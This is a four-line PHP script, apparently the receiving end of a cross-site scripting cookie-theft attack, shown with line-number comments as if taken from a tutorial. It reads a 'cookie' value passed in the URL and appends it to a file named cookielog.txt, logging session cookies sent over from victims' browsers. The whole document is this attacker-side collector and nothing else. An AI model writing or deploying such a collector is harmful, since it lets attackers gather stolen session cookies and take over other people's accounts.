<?php                                      // line 1
$cookie = $HTTP_GET_VARS["cookie"];       // line 2
$file = fopen('cookielog.txt', 'a');     // line 3
fwrite($file, $cookie . "\n\n");        // line 4
?>